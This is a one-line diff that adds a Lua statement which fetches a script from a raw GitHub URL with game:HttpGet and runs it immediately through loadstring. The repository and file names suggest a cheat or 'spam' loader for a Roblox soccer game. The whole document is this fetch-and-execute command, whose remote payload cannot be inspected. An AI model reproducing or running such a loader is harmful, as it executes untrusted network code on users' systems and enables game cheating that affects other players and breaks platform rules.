@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/build-a-soccer-club-spam6-pp6yksmwjpvycu.lua"))()
